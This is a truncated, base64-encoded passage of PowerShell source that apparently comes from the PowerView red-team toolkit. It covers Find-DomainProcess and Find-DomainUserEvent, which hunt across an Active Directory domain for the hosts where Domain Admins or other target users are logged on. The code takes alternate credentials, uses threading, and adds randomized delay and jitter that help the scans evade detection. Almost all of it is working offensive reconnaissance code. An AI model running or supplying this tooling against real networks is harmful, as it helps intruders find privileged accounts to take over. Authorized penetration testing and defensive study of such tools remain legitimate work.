AgICAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgICAgICAgICAjIGlmIHRoZSBzZXNzaW9uIHVzZXIgaXMgaW4gdGhlIHRhcmdldCBsaXN0LCBkaXNwbGF5IHNvbWUgb3V0cHV0CiAgICAgICAgICAgICAgICAgICAgICAgIGVsc2VpZiAoJFRhcmdldFVzZXJzIC1Db250YWlucyAkUHJvY2Vzcy5Vc2VyKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAkUHJvY2VzcwogICAgICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgICMgb25seSBpZ25vcmUgdGhyZWFkaW5nIGlmIC1EZWxheSBpcyBwYXNzZWQKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEZWxheSddIC1vciAkUFNCb3VuZFBhcmFtZXRlcnNbJ1N0b3BPblN1Y2Nlc3MnXSkgewoKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluUHJvY2Vzc10gVG90YWwgbnVtYmVyIG9mIGhvc3RzOiAkKCRUYXJnZXRDb21wdXRlcnMuY291bnQpIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Eb21haW5Qcm9jZXNzXSBEZWxheTogJERlbGF5LCBKaXR0ZXI6ICRKaXR0ZXIiCiAgICAgICAgICAgICRDb3VudGVyID0gMAogICAgICAgICAgICAkUmFuZE5vID0gTmV3LU9iamVjdCBTeXN0ZW0uUmFuZG9tCgogICAgICAgICAgICBGb3JFYWNoICgkVGFyZ2V0Q29tcHV0ZXIgaW4gJFRhcmdldENvbXB1dGVycykgewogICAgICAgICAgICAgICAgJENvdW50ZXIgPSAkQ291bnRlciArIDEKCiAgICAgICAgICAgICAgICAjIHNsZWVwIGZvciBvdXIgc2VtaS1yYW5kb21pemVkIGludGVydmFsCiAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAkUmFuZE5vLk5leHQoKDEtJEppdHRlcikqJERlbGF5LCAoMSskSml0dGVyKSokRGVsYXkpCgogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluUHJvY2Vzc10gRW51bWVyYXRpbmcgc2VydmVyICRUYXJnZXRDb21wdXRlciAoJENvdW50ZXIgb2YgJCgkVGFyZ2V0Q29tcHV0ZXJzLmNvdW50KSkiCiAgICAgICAgICAgICAgICAkUmVzdWx0ID0gSW52b2tlLUNvbW1hbmQgLVNjcmlwdEJsb2NrICRIb3N0RW51bUJsb2NrIC1Bcmd1bWVudExpc3QgJFRhcmdldENvbXB1dGVyLCAkVGFyZ2V0UHJvY2Vzc05hbWUsICRUYXJnZXRVc2VycywgJENyZWRlbnRpYWwKICAgICAgICAgICAgICAgICRSZXN1bHQKCiAgICAgICAgICAgICAgICBpZiAoJFJlc3VsdCAtYW5kICRTdG9wT25TdWNjZXNzKSB7CiAgICAgICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluUHJvY2Vzc10gVGFyZ2V0IHVzZXIgZm91bmQsIHJldHVybmluZyBlYXJseSIKICAgICAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgICAgICBlbHNlIHsKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtRG9tYWluUHJvY2Vzc10gVXNpbmcgdGhyZWFkaW5nIHdpdGggdGhyZWFkczogJFRocmVhZHMiCgogICAgICAgICAgICAjIGlmIHdlJ3JlIHVzaW5nIHRocmVhZGluZywga2ljayBvZmYgdGhlIHNjcmlwdCBibG9jayB3aXRoIE5ldy1UaHJlYWRlZEZ1bmN0aW9uCiAgICAgICAgICAgICRTY3JpcHRQYXJhbXMgPSBAewogICAgICAgICAgICAgICAgJ1Byb2Nlc3NOYW1lJyA9ICRUYXJnZXRQcm9jZXNzTmFtZQogICAgICAgICAgICAgICAgJ1RhcmdldFVzZXJzJyA9ICRUYXJnZXRVc2VycwogICAgICAgICAgICAgICAgJ0NyZWRlbnRpYWwnID0gJENyZWRlbnRpYWwKICAgICAgICAgICAgfQoKICAgICAgICAgICAgIyBpZiB3ZSdyZSB1c2luZyB0aHJlYWRpbmcsIGtpY2sgb2ZmIHRoZSBzY3JpcHQgYmxvY2sgd2l0aCBOZXctVGhyZWFkZWRGdW5jdGlvbiB1c2luZyB0aGUgJEhvc3RFbnVtQmxvY2sgKyBwYXJhbXMKICAgICAgICAgICAgTmV3LVRocmVhZGVkRnVuY3Rpb24gLUNvbXB1dGVyTmFtZSAkVGFyZ2V0Q29tcHV0ZXJzIC1TY3JpcHRCbG9jayAkSG9zdEVudW1CbG9jayAtU2NyaXB0UGFyYW1ldGVycyAkU2NyaXB0UGFyYW1zIC1UaHJlYWRzICRUaHJlYWRzCiAgICAgICAgfQogICAgfQp9CgoKZnVuY3Rpb24gRmluZC1Eb21haW5Vc2VyRXZlbnQgewo8IwouU1lOT1BTSVMKCkZpbmRzIGxvZ29uIGV2ZW50cyBvbiB0aGUgY3VycmVudCAob3IgcmVtb3RlIGRvbWFpbikgZm9yIHRoZSBzcGVjaWZpZWQgdXNlcnMuCgpBdXRob3I6IExlZSBDaHJpc3RlbnNlbiAoQHRpZmtpbl8pLCBKdXN0aW4gV2FybmVyIChAc2l4ZHViKSwgV2lsbCBTY2hyb2VkZXIgKEBoYXJtajB5KSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LURvbWFpblVzZXIsIEdldC1Eb21haW5Hcm91cE1lbWJlciwgR2V0LURvbWFpbkNvbnRyb2xsZXIsIEdldC1Eb21haW5Vc2VyRXZlbnQsIE5ldy1UaHJlYWRlZEZ1bmN0aW9uICAKCi5ERVNDUklQVElPTgoKRW51bWVyYXRlcyBhbGwgZG9tYWluIGNvbnRyb2xsZXJzIGZyb20gdGhlIHNwZWNpZmllZCAtRG9tYWluCihkZWZhdWx0IG9mIHRoZSBsb2NhbCBkb21haW4pIHVzaW5nIEdldC1Eb21haW5Db250cm9sbGVyLCBlbnVtZXJhdGVzCnRoZSBsb2dvbiBldmVudHMgZm9yIGVhY2ggdXNpbmcgR2V0LURvbWFpblVzZXJFdmVudCwgYW5kIGZpbHRlcnMKdGhlIHJlc3VsdHMgYmFzZWQgb24gdGhlIHRhcmdldGluZyBjcml0ZXJpYS4KCi5QQVJBTUVURVIgQ29tcHV0ZXJOYW1lCgpTcGVjaWZpZXMgYW4gZXhwbGljaXQgY29tcHV0ZXIgbmFtZSB0byByZXRyaWV2ZSBldmVudHMgZnJvbS4KCi5QQVJBTUVURVIgRG9tYWluCgpTcGVjaWZpZXMgYSBkb21haW4gdG8gcXVlcnkgZm9yIGRvbWFpbiBjb250cm9sbGVycyB0byBlbnVtZXJhdGUuCkRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgRmlsdGVyCgpBIGhhc2h0YWJsZSBvZiBQb3dlclZpZXcuTG9nb25FdmVudCBwcm9wZXJ0aWVzIHRvIGZpbHRlciBmb3IuClRoZSAnb3B8b3BlcmF0b3J8b3BlcmF0aW9uJyBjbGF1c2UgY2FuIGhhdmUgJyYnLCAnfCcsICdhbmQnLCBvciAnb3InLAphbmQgaXMgJ29yJyBieSBkZWZhdWx0LCBtZWFuaW5nIGF0IGxlYXN0IG9uZSBjbGF1c2UgbWF0Y2hlcyBpbnN0ZWFkIG9mIGFsbC4KU2VlIHRoZSBleGFwbGVzIGZvciB1c2FnZS4KCi5QQVJBTUVURVIgU3RhcnRUaW1lCgpUaGUgW0RhdGVUaW1lXSBvYmplY3QgcmVwcmVzZW50aW5nIHRoZSBzdGFydCBvZiB3aGVuIHRvIGNvbGxlY3QgZXZlbnRzLgpEZWZhdWx0IG9mIFtEYXRlVGltZV06Ok5vdy5BZGREYXlzKC0xKS4KCi5QQVJBTUVURVIgRW5kVGltZQoKVGhlIFtEYXRlVGltZV0gb2JqZWN0IHJlcHJlc2VudGluZyB0aGUgZW5kIG9mIHdoZW4gdG8gY29sbGVjdCBldmVudHMuCkRlZmF1bHQgb2YgW0RhdGVUaW1lXTo6Tm93LgoKLlBBUkFNRVRFUiBNYXhFdmVudHMKClRoZSBtYXhpbXVtIG51bWJlciBvZiBldmVudHMgKHBlciBob3N0KSB0byByZXRyaWV2ZS4gRGVmYXVsdCBvZiA1MDAwLgoKLlBBUkFNRVRFUiBVc2VySWRlbnRpdHkKClNwZWNpZmllcyBvbmUgb3IgbW9yZSB1c2VyIGlkZW50aXRpZXMgdG8gc2VhcmNoIGZvci4KCi5QQVJBTUVURVIgVXNlckRvbWFpbgoKU3BlY2lmaWVzIHRoZSBkb21haW4gdG8gcXVlcnkgZm9yIHVzZXJzIHRvIHNlYXJjaCBmb3IsIGRlZmF1bHRzIHRvIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5QQVJBTUVURVIgVXNlckxEQVBGaWx0ZXIKClNwZWNpZmllcyBhbiBMREFQIHF1ZXJ5IHN0cmluZyB0aGF0IGlzIHVzZWQgdG8gc2VhcmNoIGZvciB0YXJnZXQgdXNlcnMuCgouUEFSQU1FVEVSIFVzZXJTZWFyY2hCYXNlCgpTcGVjaWZpZXMgdGhlIExEQVAgc291cmNlIHRvIHNlYXJjaCB0aHJvdWdoIGZvciB0YXJnZXQgdXNlcnMuCmUuZy4gIkxEQVA6Ly9PVT1zZWNyZXQsREM9dGVzdGxhYixEQz1sb2NhbCIuIFVzZWZ1bCBmb3IgT1UgcXVlcmllcy4KCi5QQVJBTUVURVIgVXNlckdyb3VwSWRlbnRpdHkKClNwZWNpZmllcyBhIGdyb3VwIGlkZW50aXR5IHRvIHF1ZXJ5IGZvciB0YXJnZXQgdXNlcnMsIGRlZmF1bHRzIHRvICdEb21haW4gQWRtaW5zLgpJZiBhbnkgb3RoZXIgdXNlciBzcGVjaWZpY2F0aW9ucyBhcmUgc2V0LCB0aGVuIFVzZXJHcm91cElkZW50aXR5IGlzIGlnbm9yZWQuCgouUEFSQU1FVEVSIFVzZXJBZG1pbkNvdW50CgpTd2l0Y2guIFNlYXJjaCBmb3IgdXNlcnMgdXNlcnMgd2l0aCAnKGFkbWluQ291bnQ9MSknIChtZWFuaW5nIGFyZS93ZXJlIHByaXZpbGVnZWQpLgoKLlBBUkFNRVRFUiBTZXJ2ZXIKClNwZWNpZmllcyBhbiBBY3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRvIGJpbmQgdG8uCgouUEFSQU1FVEVSIFNlYXJjaFNjb3BlCgpTcGVjaWZpZXMgdGhlIHNjb3BlIHRvIHNlYXJjaCB1bmRlciBmb3IgY29tcHV0ZXJzLCBCYXNlL09uZUxldmVsL1N1YnRyZWUgKGRlZmF1bHQgb2YgU3VidHJlZSkuCgouUEFSQU1FVEVSIFJlc3VsdFBhZ2VTaXplCgpTcGVjaWZpZXMgdGhlIFBhZ2VTaXplIHRvIHNldCBmb3IgdGhlIExEQVAgc2VhcmNoZXIgb2JqZWN0LgoKLlBBUkFNRVRFUiBTZXJ2ZXJUaW1lTGltaXQKClNwZWNpZmllcyB0aGUgbWF4aW11bSBhbW91bnQgb2YgdGltZSB0aGUgc2VydmVyIHNwZW5kcyBzZWFyY2hpbmcuIERlZmF1bHQgb2YgMTIwIHNlY29uZHMuCgouUEFSQU1FVEVSIFRvbWJzdG9uZQoKU3dpdGNoLiBTcGVjaWZpZXMgdGhhdCB0aGUgc2VhcmNoZXIgc2hvdWxkIGFsc28gcmV0dXJuIGRlbGV0ZWQvdG9tYnN0b25lZCBvYmplY3RzLgoKLlBBUkFNRVRFUiBDcmVkZW50aWFsCgpBIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXSBvYmplY3Qgb2YgYWx0ZXJuYXRlIGNyZWRlbnRpYWxzCmZvciBjb25uZWN0aW9uIHRvIHRoZSB0YXJnZXQgY29tcHV0ZXIocykuCgouUEFSQU1FVEVSIFN0b3BPblN1Y2Nlc3MKClN3aXRjaC4gU3RvcCBodW50aW5nIGFmdGVyIGZpbmRpbmcgYWZ0ZXIgZmluZGluZyBhIHRhcmdldCB1c2VyLgoKLlBBUkFNRVRFUiBEZWxheQoKU3BlY2lmaWVzIHRoZSBkZWxheSAoaW4gc2Vjb25kcykgYmV0d2VlbiBlbnVtZXJhdGluZyBob3N0cywgZGVmYXVsdHMgdG8gMC4KCi5QQVJBTUVURVIgSml0dGVyCgpTcGVjaWZpZXMgdGhlIGppdHRlciAoMC0xLjApIHRvIGFwcGx5IHRvIGFueSBzcGVjaWZpZWQgLURlbGF5LCBkZWZhdWx0cyB0byArLy0gMC4zCgouUEFSQU1FVEVSIFRocmVhZHMKClRoZSBudW1iZXIgb2YgdGhyZWFkcyB0byB1c2UgZm9yIHVzZXIgc2VhcmNoaW5nLCBkZWZhdWx0cyB0byAyMC4KCi5FWEFNUExFCgpGaW5kLURvbWFpblVzZXJFdmVudAoKU2VhcmNoIGZvciBhbnkgdXNlciBldmVudHMgbWF0Y2hpbmcgZG9tYWluIGFkbWlucyBvbiBldmVyeSBEQyBpbiB0aGUgY3VycmVudCBkb21haW4uCgouRVhBTVBMRQoKJGNyZWQgPSBHZXQtQ3JlZGVudGlhbCBkZXZcYWRtaW5pc3RyYXRvcgpGaW5kLURvbWFpblVzZXJFdmVudCAtQ29tcHV0ZXJOYW1lICdzZWNvbmRhcnkuZGV2LnRlc3RsYWIubG9jYWwnIC1Vc2VySWRlbnRpdHkgJ2pvaG4nCgpTZWFyY2ggZm9yIGFueSB1c2VyIGV2ZW50cyBtYXRjaGluZyB0aGUgdXNlciAnam9obicgb24gdGhlICdzZWNvbmRhcnkuZGV2LnRlc3RsYWIubG9jYWwnCmRvbWFpbiBjb250cm9sbGVyIHVzaW5nIHRoZSBhbHRlcm5hdGUgY3JlZGVudGlhbAoKLkVYQU1QTEUKCidwcmltYXJ5LnRlc3RsYWIubG9jYWwgfCBGaW5kLURvbWFpblVzZXJFdmVudCAtRmlsdGVyIEB7J0lwQWRkcmVzcyc9JzE5Mi4xNjguNTIuMjAwfDE5Mi4xNjguNTIuMjAxJ30KCkZpbmQgdXNlciBldmVudHMgb24gdGhlIHByaW1hcnkudGVzdGxhYi5sb2NhbCBzeXN0ZW0gd2hlcmUgdGhlIGV2ZW50IG1hdGNoZXMKdGhlIElQQWRkcmVzcyAnMTkyLjE2OC41Mi4yMDAnIG9yICcxOTIuMTY4LjUyLjIwMScuCgouRVhBTVBMRQoKJGNyZWQgPSBHZXQtQ3JlZGVudGlhbCB0ZXN0bGFiXGFkbWluaXN0cmF0b3IKRmluZC1Eb21haW5Vc2VyRXZlbnQgLURlbGF5IDEgLUZpbHRlciBAeydMb2dvbkd1aWQnPSdiODQ1OGFhOS1iMzZlLWVhYTEtOTZlMC00NTUxMDAwZmRiMTknOyAnVGFyZ2V0TG9nb25JZCcgPSAnMTAyMzgxMjgnOyAnb3AnPScmJ30KCkZpbmQgdXNlciBldmVudHMgbWF0aGluZyB0aGUgc3BlY2lmaWVkIEdVSUQgQU5EIHRoZSBzcGVjaWZpZWQgVGFyZ2V0TG9nb25JZCwgc2VhcmNoaW5nCnRocm91Z2ggZXZlcnkgZG9tYWluIGNvbnRyb2xsZXIgaW4gdGhlIGN1cnJlbnQgZG9tYWluLCBlbnVtZXJhdGluZyBlYWNoIERDIGluIHNlcmlhbAppbnN0ZWFkIG9mIGluIGEgdGhyZWFkZWQgbWFubmVyLCB1c2luZyB0aGUgYWx0ZXJuYXRlIGNyZWRlbnRpYWwuCgouT1VUUFVUUwoKUG93ZXJWaWV3LkxvZ29uRXZlbnQKClBvd2VyVmlldy5FeHBsaWNpdENyZWRlbnRpYWxMb2dvbgoKLkxJTksKCmh0dHA6Ly93d3cuc2l4ZHViLm5ldC8yMDE0LzExLzA3L29mZmVuc2l2ZS1ldmVudC1wYXJzaW5nLWJyaW5naW5nLWhvbWUtdHJvcGhpZXMvCiM+CgogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTU2hvdWxkUHJvY2VzcycsICcnKV0KICAgIFtEaWFnbm9zdGljcy5Db2RlQW5hbHlzaXMuU3VwcHJlc3NNZXNzYWdlQXR0cmlidXRlKCdQU1VzZURlY2xhcmVkVmFyc01vcmVUaGFuQXNzaWdubWVudHMnLCAnJyldCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNVc2VQU0NyZWRlbnRpYWxUeXBlJywgJycpXQogICAgW0RpYWdub3N0aWNzLkNvZGVBbmFseXNpcy5TdXBwcmVzc01lc3NhZ2VBdHRyaWJ1dGUoJ1BTQXZvaWRVc2luZ1BsYWluVGV4dEZvclBhc3N3b3JkJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Mb2dvbkV2ZW50JyldCiAgICBbT3V0cHV0VHlwZSgnUG93ZXJWaWV3LkV4cGxpY2l0Q3JlZGVudGlhbExvZ29uJyldCiAgICBbQ21kbGV0QmluZGluZyhEZWZhdWx0UGFyYW1ldGVyU2V0TmFtZSA9ICdEb21haW4nKV0KICAgIFBhcmFtKAogICAgICAgIFtQYXJhbWV0ZXIoUGFyYW1ldGVyU2V0TmFtZSA9ICdDb21wdXRlck5hbWUnLCBQb3NpdGlvbiA9IDAsIFZhbHVlRnJvbVBpcGVsaW5lID0gJFRydWUsIFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW0FsaWFzKCdkbnNob3N0bmFtZScsICdIb3N0TmFtZScsICduYW1lJyldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJENvbXB1dGVyTmFtZSwKCiAgICAgICAgW1BhcmFtZXRlcihQYXJhbWV0ZXJTZXROYW1lID0gJ0RvbWFpbicpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtIYXNodGFibGVdCiAgICAgICAgJEZpbHRlciwKCiAgICAgICAgW1BhcmFtZXRlcihWYWx1ZUZyb21QaXBlbGluZUJ5UHJvcGVydHlOYW1lID0gJFRydWUpXQogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW0RhdGVUaW1lXQogICAgICAgICRTdGFydFRpbWUgPSBbRGF0ZVRpbWVdOjpOb3cuQWRkRGF5cygtMSksCgogICAgICAgIFtQYXJhbWV0ZXIoVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtEYXRlVGltZV0KICAgICAgICAkRW5kVGltZSA9IFtEYXRlVGltZV06Ok5vdywKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkTWF4RXZlbnRzID0gNTAwMCwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nW11dCiAgICAgICAgJFVzZXJJZGVudGl0eSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRVc2VyRG9tYWluLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFVzZXJMREFQRmlsdGVyLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFVzZXJTZWFyY2hCYXNlLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnR3JvdXBOYW1lJywgJ0dyb3VwJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRVc2VyR3JvdXBJZGVudGl0eSA9ICdEb21haW4gQWRtaW5zJywKCiAgICAgICAgW0FsaWFzKCdBZG1pbkNvdW50JyldCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkVXNlckFkbWluQ291bnQsCgogICAgICAgIFtTd2l0Y2hdCiAgICAgICAgJENoZWNrQWNjZXNzLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSwKCiAgICAgICAgW1N3aXRjaF0KICAgICAgICAkU3RvcE9uU3VjY2VzcywKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJERlbGF5ID0gMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMC4wLCAxLjApXQogICAgICAgIFtEb3VibGVdCiAgICAgICAgJEppdHRlciA9IC4zLAoKICAgICAgICBbSW50XQogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMCldCiAgICAgICAgJFRocmVhZHMgPSAyMAogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAkVXNlclNlYXJjaGVyQXJndW1lbnRzID0gQHsKICAgICAgICAgICAgJ1Byb3BlcnRpZXMnID0gJ3NhbWFjY291bnRuYW1lJwogICAgICAgIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VySWRlbnRpdHknXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydJZGVudGl0eSddID0gJFVzZXJJZGVudGl0eSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlckRvbWFpbiddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJFVzZXJEb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJMREFQRmlsdGVyJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snTERBUEZpbHRlciddID0gJFVzZXJMREFQRmlsdGVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VyU2VhcmNoQmFzZSddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1NlYXJjaEJhc2UnXSA9ICRVc2VyU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVXNlckFkbWluQ291bnQnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydBZG1pbkNvdW50J10gPSAkVXNlckFkbWluQ291bnQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlciddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkVXNlclNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hTY29wZSddID0gJFNlYXJjaFNjb3BlIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydSZXN1bHRQYWdlU2l6ZSddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlcnZlclRpbWVMaW1pdCddKSB7ICRVc2VyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snVG9tYnN0b25lJ10gPSAkVG9tYnN0b25lIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDcmVkZW50aWFsJ10pIHsgJFVzZXJTZWFyY2hlckFyZ3VtZW50c1snQ3JlZGVudGlhbCddID0gJENyZWRlbnRpYWwgfQoKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VySWRlbnRpdHknXSAtb3IgJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VyTERBUEZpbHRlciddIC1vciAkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJTZWFyY2hCYXNlJ10gLW9yICRQU0JvdW5kUGFyYW1ldGVyc1snVXNlckFkbWluQ291bnQnXSkgewogICAgICAgICAgICAkVGFyZ2V0VXNlcnMgPSBHZXQtRG9tYWluVXNlciBAVXNlclNlYXJjaGVyQXJndW1lbnRzIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgc2FtYWNjb3VudG5hbWUKICAgICAgICB9CiAgICAgICAgZWxzZWlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1VzZXJHcm91cElkZW50aXR5J10gLW9yICgtbm90ICRQU0JvdW5kUGFyYW1ldGVyc1snRmlsdGVyJ10pKSB7CiAgICAgICAgICAgICMgb3RoZXJ3aXNlIHdlJ3JlIHF1ZXJ5aW5nIGEgc3BlY2lmaWMgZ3JvdXAKICAgICAgICAgICAgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHMgPSBAewogICAgICAgICAgICAgICAgJ0lkZW50aXR5JyA9ICRVc2VyR3JvdXBJZGVudGl0eQogICAgICAgICAgICAgICAgJ1JlY3Vyc2UnID0gJFRydWUKICAgICAgICAgICAgfQogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJVc2VyR3JvdXBJZGVudGl0eTogJFVzZXJHcm91cElkZW50aXR5IgogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VyRG9tYWluJ10pIHsgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHNbJ0RvbWFpbiddID0gJFVzZXJEb21haW4gfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydVc2VyU2VhcmNoQmFzZSddKSB7ICRHcm91cFNlYXJjaGVyQXJndW1lbnRzWydTZWFyY2hCYXNlJ10gPSAkVXNlclNlYXJjaEJhc2UgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkR3JvdXBTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyJ10gPSAkU2VydmVyIH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkR3JvdXBTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1Jlc3VsdFBhZ2VTaXplJ10pIHsgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHNbJ1Jlc3VsdFBhZ2VTaXplJ10gPSAkUmVzdWx0UGFnZVNpemUgfQogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkR3JvdXBTZWFyY2hlckFyZ3VtZW50c1snU2VydmVyVGltZUxpbWl0J10gPSAkU2VydmVyVGltZUxpbWl0IH0KICAgICAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJEdyb3VwU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgeyAkR3